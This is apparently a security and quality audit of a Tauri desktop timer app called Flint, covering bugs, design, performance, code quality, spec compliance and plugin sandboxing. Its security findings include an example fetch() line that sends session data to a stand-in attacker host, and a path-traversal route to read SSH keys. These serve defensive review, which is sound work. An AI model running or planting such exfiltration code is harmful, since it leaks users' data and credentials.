# Flint — Comprehensive Audit Report

> Phase 1–6 audit. All findings categorized **CRITICAL / HIGH / MEDIUM / LOW**. No fixes applied.

**Audit date:** 2026-04-15
**Scope:** `src-tauri/` (10 Rust files), `src/` (23 TS/TSX files), 5 built-in plugins, configs, PRD compliance.
**Reviewer note:** This is a ruthless first pass. Not everything flagged is a blocker — triage against the v1 release bar.

---

## 1. BUGS

### CRITICAL

**B-C1. Recovery clock over-counts pause duration.**
`src-tauri/src/lib.rs:95-101` computes recovery `extra_sec` as `(now - started_at) - elapsed_sec`. This baseline uses the session's original start time, not the last recovery save. If a session was paused at any point, the pause duration is silently added back to `elapsed_sec` on recovery.

Example: user starts a pomodoro, runs 1m (elapsed=60), pauses 30m, resumes, tick saves recovery at elapsed=70, crash. Relaunch 5s later → `extra = (30m + 75s) - 70 = 1805s`. Session restores as `elapsed=1875` instead of ~75. Completely wrong.

**Fix direction:** store `last_saved_at: DateTime<Utc>` in `RecoveryFile` and compute `extra = (now - last_saved_at)` for running state only.

**B-C2. Plugin JavaScript has full access to the main webview.**
`src/components/plugin-host.tsx:192` executes plugin source via `new Function("flint", p.source)`. This runs inside the main React webview with no isolation:
- Full access to `window`, `document`, `localStorage`, `sessionStorage`
- Can reach `window.__TAURI__` / `window.__TAURI_INTERNALS__` and call **any** registered Tauri command (not just the sandboxed `flint` API)
- Can manipulate React DOM, intercept events, exfiltrate data
- No CSP constraint (see B-C3) → can `fetch()` arbitrary URLs

This is a direct violation of `CLAUDE.md` "PLUGIN ISOLATION: plugins receive a sandboxed API object. They cannot access filesystem directly or modify core state outside the API." A malicious community plugin dropped into `~/.flint/plugins/` is effectively unrestricted.

**Fix direction:** run plugins in a dedicated iframe/webview with strict CSP and an RPC bridge, or at minimum use a `with` scope that shadows `window` before evaluation (weak but better than nothing).

**B-C3. Content Security Policy disabled.**
`src-tauri/tauri.conf.json:28` sets `"csp": null`. Combined with B-C2, plugins can hit arbitrary hosts. This also defeats XSS mitigations for any future feature that renders user content.

### HIGH

**B-H1. Global keyboard handler re-registers every second.**
`src/App.tsx:179-310`. The `useEffect` dependency array on line 301 includes `state`, which `useTimer` replaces on every `session:tick` (via `setState((prev) => ({...prev, elapsed_sec}))`). Result: `window.addEventListener("keydown", ...)` + cleanup runs every tick while a session is active. Add/remove churn is cheap but real, and creates subtle bugs where a key hit right at the boundary can land on a stale closure.

**Fix direction:** use a ref to keep the latest `state` without re-binding; only depend on `view`, `stopConfirmOpen`, `tagInputOpen`, `startSession`, etc.

**B-H2. `Tray → Quit` exits without finalizing a running session.**
`src-tauri/src/tray.rs:170-172` calls `app.exit(0)` directly. No `stop_session` / `cancel_session` fires. The user's focus block is NOT written to `~/.flint/sessions/`. Instead, recovery.json remains, and the session silently auto-resumes on next launch — which may not be what "Quit" implies. Combined with B-C1, the auto-resumed session will also have wrong elapsed time.

**Fix direction:** on Quit, if `status != Idle`, call `finalize_session(completed=false)` (or prompt the user), then exit.

**B-H3. Session write failure destroys in-memory state.**
`src-tauri/src/commands.rs:123-176`. `finalize_session` calls `write_session_file` → on error (disk full, permission denied, readonly FS), returns the error **after** state was already partially consumed? Actually it bails **before** `state.reset()`, which is good. But: `delete_recovery()` is called on the happy path only AFTER write succeeds. If write fails, recovery.json still exists → user can retry by relaunching. OK on paper, but:
- The `cache::upsert_from_file` error is silently logged and swallowed (line 146).
- The session file might be partially written (no atomic rename) and then re-parsed as a broken JSON on next rebuild.

**Fix direction:** write to `*.json.tmp` then atomic rename. Retry cache upsert on next startup via rebuild.

**B-H4. `recovery.json` and `config.toml` parse errors silently fall back to defaults.**
- `src-tauri/src/storage.rs:108-113` — broken recovery file prints to stderr then returns `None`. User loses any session that was recovering, no in-app warning.
- `src-tauri/src/config.rs:166` — broken config.toml prints to stderr, uses defaults, and the next save **overwrites the broken file** with defaults, destroying the user's edits.

**Fix direction:** rename broken files to `recovery.json.broken.<timestamp>` before discarding; surface a toast on next launch.

**B-H5. Overlay window shadow contradicts glassmorphism intent.**
(Also tagged under Design.) `src/overlay-app.tsx:187-190` applies a heavy inline `boxShadow: "0 10px 30px rgba(0,0,0,0.4), 0 2px 8px rgba(0,0,0,0.3)"` AND a `shadow-2xl` Tailwind class, on top of `backdrop-blur-md`. The shadow is what the user explicitly asked to remove. Not a crash bug but a functional regression from the agreed design.

**B-H6. Async unlisteners leak if cleanup runs before `.then` resolves.**
`src/App.tsx:112`, `src/App.tsx:137`, `src/hooks/use-timer.ts:76`, `src/overlay-app.tsx:44-68`. Pattern:
```ts
unlisteners.push(listen("foo", ...));
return () => unlisteners.forEach(p => p.then(fn => fn()).catch(() => {}));
```
If the component unmounts before `listen()` resolves, `p.then(fn => fn())` still runs eventually, which is fine — but the race is fragile. The explicit `canceled` flag in `plugin-host.tsx:84` is the correct pattern; other sites don't use it. React StrictMode's double-invoke should surface this in dev.

### MEDIUM

**B-M1. Overlay saved position not validated against current monitors.**
`src-tauri/src/overlay.rs:43-52`. On launch, the saved `(x, y)` is applied blindly. If the user disconnects the monitor that held the overlay, it spawns off-screen and is undraggable. `compute_default_position` only runs when no saved position exists.

**Fix direction:** after build, check `window.outer_position()` against `available_monitors()`; if not visible, snap back to `compute_default_position`.

**B-M2. `TagInput` auto-commits on blur, including accidental clicks.**
`src/components/tag-input.tsx:49` — `onBlur={commit}`. Clicking anywhere outside the input confirms the edit. A user who opens `Ctrl+T`, types, then clicks the gear icon now has their draft tags applied to the active session whether they meant to or not. Escape works (it unmounts before blur), but the blur-to-commit contract is hidden from the user.

**B-M3. Cache drift only detected at app launch.**
`src-tauri/src/cache.rs:290-303`. `initialize()` compares file count to row count once. If the user deletes a session JSON mid-session or between page loads without restarting Flint, the sidebar Session Log keeps showing the stale row until next launch. PRD 4.5 says "Rebuildable from JSON — treat it as disposable" but runtime drift is not handled.

**Fix direction:** watch `sessions/` for deletions via `notify` crate, or invalidate cache row on `cache_session_detail` miss.

**B-M4. `next_interval` target_sec overflow when plugin is slow.**
`src-tauri/src/lib.rs:37-43`. Once `ci.elapsed_sec >= target`, `ended_emitted` blocks re-emission but the tick keeps incrementing elapsed beyond target. The Pomodoro plugin handles the event async; if there's any latency (frontend idle, IPC queue), the interval over-runs by 1–N seconds. Observable as the progress bar momentarily exceeding 100% before the new interval starts.

**Fix direction:** clamp `current_interval.elapsed_sec` at `target_sec` when `ended_emitted`.

**B-M5. Cancelled sessions excluded from streak counting.**
`src-tauri/src/cache.rs:418,482,582,609` — every stats query uses `WHERE completed = 1`. A user who runs 40 minutes of focus then hits Escape to cancel (e.g. finishing early) does not get credit for that day. This may be intentional, but PRD doesn't say so explicitly.

**B-M6. `SettingsPanel` `useEffect` overwrites in-progress draft.**
`src/components/settings-panel.tsx:24-26`. When a plugin config save triggers `onConfigPersisted → resyncFromBackend → onSaved`, the parent's `config` state updates, which re-renders `<SettingsPanel initial={config} />`, which runs `useEffect(() => setDraft(initial), [initial])` → **wipes any unsaved fields the user was editing**. Reproducer: open Settings, drag the Sidebar width slider, then toggle a Pomodoro plugin field → the slider snaps back.

**B-M7. `window.addEventListener("flint:*:refresh")` leaks across unmount/remount.**
`src/components/session-log.tsx:40-44` and `src/components/stats-dashboard.tsx:58-60` add DOM event listeners with stable refs. Cleanup is correct today but the pattern assumes the plugin's `window.dispatchEvent` is the only sender — a future plugin that names a similar event collides silently.

**B-M8. `plugin_storage_key_path` is Windows-unsafe.**
`src-tauri/src/commands.rs:510-518` rejects `/`, `\`, `..`, but not `:`, `*`, `?`, `<`, `>`, `|`, `"`, nor null bytes. A community plugin calling `flint.storage.set("a:b", ...)` would pass validation but `fs::write` fails on Windows with a cryptic error. Same risk in `plugin_storage_dir`.

**B-M9. Session filename length can exceed Windows MAX_PATH.**
`src-tauri/src/storage.rs:125-134`. Tag slugify preserves length; combined with `~/.flint/sessions/` prefix and a long home-directory path, tags over ~100 chars push past 260 bytes on older Windows setups without long-path support.

**Fix direction:** truncate `primary_tag` to 32 chars.

**B-M10. `completed_intervals` not trimmed for zero-duration intervals before saving.**
`src-tauri/src/storage.rs:135-141`. Only the *current* interval is gated by `elapsed_sec > 0`. A sequence like start → immediate `next_interval` would push empty intervals into `completed_intervals` and then write them. Minor data-quality issue.

### LOW

**B-L1. `eprintln!` as error surfacing.**
`lib.rs:73,127,159,179,181`, `storage.rs:110`, `config.rs:166,174,177`, `plugins.rs:93,127,134,146,164`, `cache.rs:296`, `commands.rs:137,146`. Errors are printed to a console the user never sees. At minimum, a lightweight `log` crate with a rotating file log in `~/.flint/flint.log` would be valuable for debugging user reports.

**B-L2. Pomodoro auto-start race.**
`src-tauri/plugins/pomodoro/index.js:5-24`. On `interval:end`, plugin calls `nextInterval()` then conditionally `pauseSession()`. Between those two IPC round-trips, one tick can fire, so the break interval's `elapsed_sec` starts at 1 instead of 0. Cosmetic.

**B-L3. `countdown` plugin relies on core config section.**
`src-tauri/plugins/countdown/manifest.json:11-20`. `config_section: "core"` means the countdown plugin writes to `core.countdown_default_min`, which is shared by the timer engine. Cross-section coupling breaks the "plugin config is private to the plugin" mental model.

**B-L4. `state?.status` dependency in `useCallback` captures stale `state`.**
`src/App.tsx:165`, `src/App.tsx:152`. Listing only `state?.status` but closing over the full `state` object means `tags` reads the status at callback creation time. Works today because `setTags` reads `state.tags` via the timer engine anyway, but fragile.

**B-L5. `Enter` in `stopConfirmOpen` dispatches `mark_question` if an input has focus.**
`src/App.tsx:258-272`. `inInput` check blocks the whole Enter path. If the user clicks the End button with mouse while an input elsewhere has focus, pressing Enter re-marks a question instead of confirming. Narrow but worth a note.

---

## 2. DESIGN / UI ISSUES

### HIGH

**D-H1. Overlay pill drop shadow is exactly what the user asked to remove.**
`src/overlay-app.tsx:184-190`. Current look: `shadow-2xl` + inline `0 10px 30px rgba(0,0,0,0.4)` + `backdrop-blur-md`. The backdrop-blur is already doing glassmorphism; the heavy shadow fights it and adds the "floating card on top of the OS" feel the user wants gone.
**Fix:** drop both shadows; keep `backdrop-blur-md` + `bg-[var(--bg-secondary)]/80` + a 1px `border-white/5` highlight for float.

**D-H2. Range inputs use browser-default styling.**
`src/components/settings-panel.tsx:94-106,158-171`. `accent-[var(--accent)]` is the extent of customization. On Windows this renders as a silver track with a blue/accent fill and a chunky thumb — "unpolished" exactly as the user called out.
**Fix:** author `input[type=range]::-webkit-slider-runnable-track` + `::-webkit-slider-thumb` rules in `index.css`. Target: 2px track bg-elevated, 12px thumb bg-accent, no box-shadow.

**D-H3. Shadows on notifications and tray toast violate PRD "no shadows except overlay".**
`src/components/notifications.tsx:11` — `shadow-lg`.
`src/components/tray-toast.tsx:8` — `shadow-lg`.
PRD 7.7: "No shadows (except overlay, which needs a subtle shadow to float visually)". Remove both.

**D-H4. Sidebar is not edge-draggable.**
`src/components/sidebar.tsx:63-67`. Width comes from `config.appearance.sidebar_width` only; resize requires opening Settings → dragging a slider → Save. Obsidian/VS Code users expect to grab the right edge of the sidebar and drag.
**Fix:** add an 4px-wide invisible hit target on the sidebar's right border with `cursor-col-resize`, pointer event listeners, and debounced `update_config`.

### MEDIUM

**D-M1. Stats dashboard hardcodes hex colors instead of CSS vars.**
`src/components/stats-dashboard.tsx:23-24` — `const ACCENT = "#22c55e"; const MUTED = "#555555";`.
`src/components/stats-dashboard.tsx:256,264,271,278-283` — `stroke="#333333"`, `background: "#1e1e1e"`, etc. If `--accent` ever changes, the bar chart and tooltip go out of sync. Recharts doesn't accept CSS vars directly, so use a `useMemo` that reads from `getComputedStyle(document.documentElement)` once.

**D-M2. Stats heatmap hardcodes colors and gradient ramp.**
`src/components/stats-heatmap.tsx:140-146,149`. `#22c55e40` / `#2d2d2d` — same story. The ramp itself is OK but wire it to vars.

**D-M3. Heatmap view has dead space below the grid.**
`src/components/stats-dashboard.tsx:206-229`. `HeatmapView` shows Days Active + Focus Total, then the heatmap, then nothing. User requested: longest session, most productive day, total all-time.
**Fix:** add three cards below the grid: **Longest session** (query `MAX(duration_sec) WHERE completed = 1`), **Best day** (`date + SUM(duration_sec) GROUP BY date ORDER BY SUM DESC LIMIT 1`), **All-time focus** (reuse existing aggregate).

**D-M4. "End session?" dialog is inline but still reads as a modal block.**
`src/components/timer-display.tsx:149-172`. It's positioned in-flow under the timer (better than a modal), but the red border + elevated background + buttons make it feel like a popup. Consider: replace with a single-line inline prompt (`End session? ↵ confirm · esc cancel`) in the hint-text slot, no separate card.

**D-M5. Status bar is sparse.**
`src/components/status-bar.tsx:10-28`. Shows mode, status, Q:N, elapsed. Missing: today's focus total, streak indicator, current interval remaining. Also no plugin `status-bar` slot is rendered (PRD 7.1 says it should exist).

**D-M6. Notifications have per-plugin label in bold muted uppercase.**
`src/components/notifications.tsx:16-17`. The `pluginId` label is always shown even for core plugins. Feels noisy for Pomodoro's "Focus done. Break time." — shows `POMODORO\n Focus done. Break time.` Consider hiding the label for default plugins.

**D-M7. Session Log date-range chips and tag filter share tight space.**
`src/components/session-log.tsx:81-90`. On a 220px sidebar, "All · Today · 7d · Month" just barely fits. Sidebar width below ~200 would wrap awkwardly. Consider a single dropdown.

**D-M8. Keybindings section in Settings is advisory.**
`src/components/settings-panel.tsx:200-220`. Shown as read-only with a note: "Rebinding UI … lands in a later phase — edit config.toml directly for now." This is a partial implementation of PRD 7.6. If Phase 7 won't add the rebinder, this should at least link to the config file and show the user's current overrides rather than defaults.

### LOW

**D-L1. `TopBar` toggle button uses unlabeled `⟨` / `⟩` glyphs.**
`src/App.tsx:388-395`. Functional but opaque. Tooltip is "Toggle sidebar (Ctrl+B)" which helps.

**D-L2. No custom scrollbar styling.**
`src/index.css`. Any scrollable area (Settings, Session Log, Stats) uses the OS default scrollbar which is jarring in a dark-only app on Windows.
**Fix:** `::-webkit-scrollbar { width: 8px; } ::-webkit-scrollbar-thumb { background: var(--bg-elevated); }` in `index.css`.

**D-L3. Tag pills have no visual affordance for removal.**
`src/components/timer-display.tsx:111-121`. Rendered as read-only chips with no × button. To remove a tag mid-session, the user must open `Ctrl+T` and edit the raw string.

**D-L4. `select` elements in Settings use browser default.**
`src/components/settings-panel.tsx:77-87`. Similar to the range input problem — the native dropdown arrow doesn't match the rest of the dark theme on Windows.

**D-L5. Tailwind `colors` extension is unused.**
`tailwind.config.js:6-27` defines `bg.primary`, `text.secondary`, etc., but every usage in the code is `text-[var(--text-primary)]` directly. Dead config.

**D-L6. `body { user-select: none }` applies globally.**
`src/index.css:43`. Inputs override it, but the user cannot copy/select session IDs, timer values, or stats text. For a local-first, data-greppable tool, this is counter to the spirit.

**D-L7. Toggle switch thumb size creates a 1px offset at certain zoom levels.**
`src/components/settings-panel.tsx:296-326` and duplicated in `plugin-settings.tsx:243-268`. Two near-identical implementations — should live in one component.

**D-L8. `transition-[width] duration-200` on the tick-driven progress bar can cause visible lag.**
`src/components/timer-display.tsx:95` and `src/overlay-app.tsx:222`. Every second the width changes by ~1.5%, and the CSS transition lerps for 200ms, so the bar is always "catching up". At the interval boundary this compounds. Consider dropping the transition (or shortening to 50ms).

---

## 3. PERFORMANCE

### HIGH

**P-H1. Main timer keyboard effect re-registers every tick.**
See **B-H1**. In terms of perf, it's ~60 extra listener add/removes per minute. Negligible in isolation, but the `state` object is also re-created every tick in `useTimer`, which re-renders every consumer of `state` — notably `AppShell`, `TimerDisplay`, `StatusBar`, and `OverlayApp`. React will reconcile each.

**P-H2. `useTimer` replaces the entire state object every tick.**
`src/hooks/use-timer.ts:62-71`. `setState((prev) => ({ ...prev, elapsed_sec, ... }))` forces a re-render of every `state` consumer. The display-sensitive parts (`elapsed_sec`, `current_interval.elapsed_sec`) should live in a separate atom so `App.tsx`'s keyboard effect doesn't re-fire. Split into `useTimerState()` (metadata) + `useTimerTick()` (ticking values).

**P-H3. `range_stats()` fires `all_session_days()` which scans every completed session.**
`src-tauri/src/cache.rs:562`. This is called on every Week/Month stats render. With 10k sessions, scanning `started_at` for every row on every sidebar tab click is wasteful. Streaks are a global invariant — cache them in an in-memory atom invalidated on `session:complete`.

**P-H4. SQLite indexes are too narrow for common queries.**
`src-tauri/src/cache.rs:112-113`:
```sql
CREATE INDEX idx_sessions_started ON sessions(started_at);
CREATE INDEX idx_sessions_tags ON sessions(tags);
```
- `idx_sessions_tags` on a JSON string does not help any filter — no query uses `tags LIKE ...`.
- Every stats query filters `completed = 1` — no composite index, so SQLite falls back to the `started_at` index and then tests `completed` per row. At 10k rows it's fine; at 100k it will slow.
- Session Log's `ORDER BY started_at DESC LIMIT N` is fine with the existing index.

**Fix:** replace `idx_sessions_tags` with a covering index `(completed, started_at)`.

### MEDIUM

**P-M1. Recharts contributes the majority of the 553 kB bundle.**
`package.json:18` — `recharts: ^3.8.1`. Recharts pulls in `d3-scale`, `d3-shape`, `d3-path`, `d3-array`, `d3-time`, plus polyfills. A hand-rolled SVG bar chart would cut ~250 kB (the stats heatmap already does exactly this). Tree-shaking is working for unused Recharts components, but the base is still large.

**P-M2. Plugin `reload()` is synchronous across all plugins.**
`src/components/plugin-host.tsx:169-202`. `new Function(...)(api)` runs each plugin on the main thread. Currently 5 built-ins with tiny bodies — no observable stall. At community scale this blocks the UI during enable/disable.

**P-M3. `update_tooltip` contends on `EngineState` every tick.**
`src-tauri/src/lib.rs:78` calls `tray::update_tooltip(app)` after the mutex is dropped. But `update_tooltip` (`tray.rs:125-157`) re-locks both `EngineState` and `ConfigState`. That's 3 lock acquisitions per second on the engine mutex. Frontend `get_timer_state` also locks it. Contention is low today but worth noting.

**P-M4. `stats_heatmap` returns 182 cells on every tab click, no memoization.**
`src/components/stats-dashboard.tsx:40`. The component re-invokes the Rust command on mount and on refresh event. 182 cells × a few fields is cheap but could cache for 60s.

**P-M5. `notifications` setTimeout not cleared on unmount.**
`src/components/plugin-host.tsx:146-149`. If the component remounts while notifications are pending, the old timers still fire but try to `setNotifications` on an unmounted tree. React logs a warning in dev. Cleanup with a ref is trivial.

### LOW

**P-L1. `overlay_save_position` writes config.toml on every drag stop.**
`src/overlay-app.tsx:73-83` debounces to 400ms, then `src-tauri/src/overlay.rs:128-146` locks config, serializes TOML, writes the whole file. Fine for now.

**P-L2. `cache_list_sessions` with `limit: null` returns every session.**
`src/components/session-log.tsx:21-23`. Today this is fine, but Session Log has no virtual scrolling; at 5k+ rows the React list will get sluggish.

**P-L3. `PluginHost` reloads all plugins on any enable/disable.**
`src/components/plugin-host.tsx:204-210`. Tearing down subscribers + re-evaluating every plugin source on a single toggle is wasteful. Granular subscribe/unsubscribe per plugin.

---

## 4. CODE QUALITY

### MEDIUM

**Q-M1. `unwrap()` calls on paths that are safe-by-construction but should be documented.**
- `src-tauri/src/storage.rs:72` — `state.session_id.clone().unwrap()` guarded by `status == Idle` check above, but the relationship is implicit.
- `src-tauri/src/cache.rs:413,415,602-606,643-648,656-661` — multiple `.and_hms_opt(0,0,0).unwrap()` and `NaiveDate::from_ymd_opt(...).unwrap()`. These are statically safe but `expect("...")` with a reason would clarify intent.
- `src-tauri/src/cache.rs:219-220` — `serde_json::to_string(...).unwrap_or_else(|_| "[]")` is pragmatic but silently drops tag data on serialization error.

**Q-M2. Error type is `String` throughout.**
Rust idiomatic is `thiserror`-derived enum. `Result<T, String>` collapses every error to a stringified form at the boundary, losing type info and making it impossible to match on. Would be a good refactor pass before more commands are added.

**Q-M3. Duplicate SQL in `cache::rebuild` and `cache::insert_session`.**
`src-tauri/src/cache.rs:214-237` defines `insert_session` with the full `INSERT OR REPLACE` statement, then `rebuild` at line 268-282 inlines the same SQL instead of calling `insert_session`. DRY violation and a latent divergence (if the schema changes, one site will be missed).

**Q-M4. `ToggleSwitch` duplicated across settings-panel.tsx and plugin-settings.tsx.**
`src/components/settings-panel.tsx:296-326` and `src/components/plugin-settings.tsx:243-268`. Identical component, different file. Extract to `src/components/toggle-switch.tsx`.

**Q-M5. `CLAUDE.md` references `npm run lint` but no lint script exists.**
`package.json:8-13` has only `dev`, `build`, `preview`, `tauri`. No ESLint, no Prettier. PRD Section 3 + CLAUDE.md both say TypeScript strict, but there's no linter to enforce it. The `tsc` invocation in `build` will catch type errors, not style.

**Q-M6. `Config` schema has no validation between defaults and bounds.**
`src-tauri/src/config.rs`. A user hand-editing config.toml can set `pomodoro.focus_min = 0`, which makes the interval end instantly on first tick. No bounds enforcement when loading.

**Q-M7. SQLite schema adds `intervals TEXT NOT NULL DEFAULT '[]'` which is not in PRD 4.5.**
`src-tauri/src/cache.rs:102-116`. This is fine as an enhancement (lets detail queries skip parsing JSON files) but diverges silently from the spec. Either update PRD or note in a schema migration log.

**Q-M8. `intervals` serialized as TEXT (JSON string) in SQLite, not normalized.**
Same file. Interval breakdown is the only consumer, so this is a reasonable trade-off, but any future query needing to filter by interval type (e.g. "sessions with long breaks") will have to parse per row.

### LOW

**Q-L1. `TimerState.completed_intervals` is never cleared on recovery restore.**
`src-tauri/src/lib.rs:110` — restored from `rec.intervals`. Correct, but the interaction with `state.reset()` → fresh `Vec::new()` on finalize is OK. Noted for clarity.

**Q-L2. `generate_id()` uses `u32` (8 hex chars).**
`src-tauri/src/commands.rs:19-22`. 4 billion IDs is plenty for personal use, but birthday collisions show up around 65k sessions. At 10 sessions/day → 18 years. Fine for v1.

**Q-L3. `rand::thread_rng().gen()` — `rand` 0.8 is fine; would be 0.9 on a new project.**

**Q-L4. `finalize_session` does not commit the interval write on the cache through a transaction.**
`src-tauri/src/cache.rs:214-237`. A single `INSERT OR REPLACE` is implicitly atomic in SQLite, but if a future change splits into multiple statements, this needs to become a tx. Cosmetic nit.

**Q-L5. Plugin `activate()` function call is missing.**
PRD 6.3 step 4: "load `entry` JS file, provide `flint` API, call plugin's `activate()` function". `plugin-host.tsx:192` just runs the body. Today every built-in plugin is written with top-level side effects (`flint.on(...)` calls), which works. An `activate()` convention would make lifecycle cleaner (`deactivate()` on disable).

**Q-L6. `Interval.ended_emitted` is `#[serde(skip)]` but not documented as intentional.**
`src-tauri/src/timer.rs:20-22`. If a recovery file was written with `ended_emitted=true`, on reload this flag is lost (reset to false) → tick would re-emit `interval:end`. Likely harmless because the plugin handlers are idempotent, but worth a comment.

**Q-L7. TypeScript uses `unknown` generously (good), but `as any` is absent (good).**
No issues found.

**Q-L8. Dead `insert_session` path not exercised in tests.**
See Q-M3.

**Q-L9. No tests for `lib.rs::tick_once` or recovery restoration.**
`cfg(test)` modules exist in `storage.rs`, `cache.rs`, `commands.rs`, `plugins.rs` (well-covered). But `tick_once`, `build_initial_state`, `compute_default_position`, `tray::format_elapsed`, and overlay logic have no tests. See B-C1 — a test would have caught the recovery bug.

**Q-L10. `PluginManifest.config_schema` uses `HashMap<String, _>` which is unordered.**
`src-tauri/src/plugins.rs:38`. Iterating the schema produces non-deterministic field order in the plugin settings UI. On Pomodoro this means focus/break/long-break can render in any order. Use `IndexMap` or parse manifest JSON with preserving order.

---

## 5. PRD COMPLIANCE

### Tauri commands (PRD 5.2) — **all present**

PRD listed 8; code has 9 (includes `set_tags` which the PRD row *does* describe). Full list checked against `commands.rs`:

| PRD | Implemented | File |
|---|---|---|
| `start_session` | ✓ | commands.rs:40 |
| `pause_session` | ✓ | commands.rs:86 |
| `resume_session` | ✓ | commands.rs:104 |
| `stop_session` | ✓ | commands.rs:179 |
| `cancel_session` | ✓ | commands.rs:189 |
| `mark_question` | ✓ | commands.rs:199 |
| `get_timer_state` | ✓ | commands.rs:218 |
| `next_interval` | ✓ | commands.rs:238 |
| `set_tags` | ✓ | commands.rs:320 |

### Events (PRD 5.3) — **all 10 emitted**

| PRD | Emitted | Where |
|---|---|---|
| `session:start` | ✓ | commands.rs:72 |
| `session:pause` | ✓ | commands.rs:96 |
| `session:resume` | ✓ | commands.rs:115 |
| `session:tick` | ✓ | lib.rs:50 |
| `session:complete` | ✓ | commands.rs:155 (via finalize) |
| `session:cancel` | ✓ | commands.rs:157 |
| `interval:start` | ✓ | commands.rs:77, 311 |
| `interval:end` | ✓ | lib.rs:61, commands.rs:256 |
| `question:marked` | ✓ | commands.rs:209 |
| `recovery:restored` | ✓ | commands.rs:225 |

### Session JSON schema (PRD 4.2) — **matches**

`src-tauri/src/storage.rs:152-164`. `id`, `version: 1`, `started_at`, `ended_at`, `duration_sec`, `mode`, `tags`, `questions_done`, `completed`, `intervals[{type,start_sec,end_sec}]`, `plugin_data: {}` — all present and structurally identical to PRD's example. ✓

### `config.toml` (PRD 4.4) — **matches, with extensions**

All PRD fields present. Extensions that are **not** in the PRD but exist in code:
- `[overlay] x, y, always_visible` — reasonable additions for drag persistence and always-on mode
- `[plugins] enabled = {}` — needed for persistent enable/disable state; should be added to the PRD

### Keyboard shortcuts (PRD Section 8)

| PRD | Implemented |
|---|---|
| Space / Enter / Escape (fixed) | ✓ App.tsx:275-296, 260-273, 233-256 |
| `Ctrl/Cmd+B` toggle sidebar | ✓ App.tsx:191-195 |
| `Ctrl/Cmd+Shift+O` toggle overlay | ✓ App.tsx:196-202 |
| `Ctrl/Cmd+T` tag input | ✓ App.tsx:210-214 |
| `Ctrl/Cmd+,` settings | ✓ App.tsx:215-221 |
| `Ctrl/Cmd+1/2/3` mode switch (while idle) | ✓ App.tsx:222-228 |
| PRD 8.3: Tab cycles sidebar ↔ main | ✗ **not implemented** |
| PRD 8.3: Arrow keys navigate session list | ✗ **not implemented** |

### Plugin API (PRD 6.2) — **superset with one missing method**

PRD methods — all present: `on`, `getTimerState`, `nextInterval`, `getSessions`, `getCurrentSession`, `getConfig`, `setConfig`, `renderSlot`, `showNotification`, `storage.*`.

**Extensions not in PRD** (used by default plugins):
- `stopSession`, `pauseSession`, `resumeSession` — needed by Countdown/Pomodoro plugins. Update PRD.

**Missing from implementation:**
- PRD 6.3 step 4 says "call plugin's `activate()` function". Current code runs the plugin source as a top-level function body with no lifecycle method. See Q-L5.

### Settings panel (PRD 7.6)

| PRD section | Implemented |
|---|---|
| General — default mode | ✓ |
| General — countdown default duration | Partial — lives under "Plugins → Countdown" not "General" |
| Appearance — sidebar width slider | ✓ |
| Overlay — enable, position, opacity | ✓ (plus extras) |
| Keybindings — configurable | ✗ **read-only display only** |
| Plugins — enable/disable + config | ✓ |
| Data — path, open data folder, rebuild cache, export sessions | Partial — path + rebuild only; **"Open data folder"** and **"Export all sessions"** missing |

### Plugin loader (PRD 6.3)

| PRD step | Implemented |
|---|---|
| 1. Scan builtin + community dirs | ✓ plugins.rs:159 |
| 2. Validate manifest | ✓ (parse only — no schema validation of `ui_slots` / `events` strings) |
| 3. Enable/disable state in config.toml | ✓ |
| 4. Call `activate()` | ✗ |
| 5. Subscribe to declared events | Partial — declared `events` in manifest are not consulted; plugins subscribe via `flint.on(...)` at runtime regardless of manifest declaration |

### Default plugins (PRD 6.4)

All 5 present (pomodoro, stopwatch, countdown, session-log, stats). Behavior spot-checks:
- **Pomodoro** auto-start breaks/focus: ✓ via plugin + engine split.
- **Stopwatch** single interval: ✓ `build_first_interval` with `target=None`.
- **Countdown** completion notification: ✓ via `flint.showNotification` + `stopSession`.
- **Session Log** search/filter by tag/date: ✓.
- **Stats Dashboard** today/week/month/heatmap + streaks: ✓.

---

## 6. SECURITY

### CRITICAL

**S-C1. Plugin code runs in the main webview with full `window` access.**
Mirrors B-C2. A community plugin can:
1. Read `localStorage` / `sessionStorage` (if any feature starts using them).
2. Access `window.__TAURI_INTERNALS__` and call **any registered Tauri command** directly via `invoke(...)`, bypassing the `flint` API entirely. This includes `rebuild_cache`, `update_config`, `quit_app`, `stop_session`, `plugin_storage_delete`, etc.
3. Manipulate the DOM — spoof UI elements to phish the user.
4. Intercept `window.dispatchEvent` used for plugin ↔ UI communication and tamper with stats refresh or session log data.

**Minimal mitigation (now):** wrap the plugin evaluation in a strict-mode function with a shadowed `window`/`document`/`globalThis` proxy. Not bulletproof but raises the bar.
**Proper mitigation (later):** plugins run in their own off-screen `<webview>` or a dedicated Worker with an `invoke` RPC bridge that is the ONLY path to the Tauri commands; whitelist which commands each plugin can call.

**S-C2. CSP is disabled (`"csp": null`).**
`src-tauri/tauri.conf.json:28`. Plugin JS can `fetch('https://attacker.example/exfil', {method:'POST', body: JSON.stringify(await invoke("list_sessions"))})`. This is the exact "no network calls" violation the Local-First constraint exists to prevent, except a malicious plugin enables it. Set a restrictive CSP: `"csp": "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'; connect-src 'self' ipc: http://ipc.localhost"` and test that the app still loads.

### HIGH

**S-H1. Plugin manifest `entry` is not path-sanitized.**
`src-tauri/src/plugins.rs:142` does `path.join(&manifest.entry)`. If a plugin manifest sets `"entry": "../../../Windows/System32/calc.exe"`, `path.join` produces a path that `read_to_string` tries to read. It won't execute (it's fed to `new Function`), but on a system with long `.exe` files it could OOM-blow `fs::read_to_string`. More realistic vector: reading arbitrary **text** files on disk — a plugin could read `~/.ssh/id_rsa` by crafting the right relative path, then send it back out (see S-C2).

**Fix:** canonicalize both `path` (plugin dir) and `entry_path`, reject if `entry_path` does not start with canonicalized plugin dir.

**S-H2. `plugin_storage_key_path` allows Windows-reserved characters.**
See B-M8. Not a remote-exploit vector because plugins are local, but a plugin that writes to `storage.set("CON", ...)` or `storage.set("a:b", ...)` can put the Rust side into error states that surface cryptic messages. Tighten the validation regex to `^[A-Za-z0-9_.-]+$`.

### MEDIUM

**S-M1. Tag strings are not sanitized before being stored.**
`src-tauri/src/commands.rs:40-65`. Tags go from frontend → `Vec<String>` → session JSON → SQLite. No length limit, no charset restriction. A tag containing control chars or null bytes ends up in the JSON file (which is technically valid for JSON but breaks text-tool grepping) and in SQLite (as a JSON array in a TEXT column).

**S-M2. `config.toml` is user-editable and not schema-validated.**
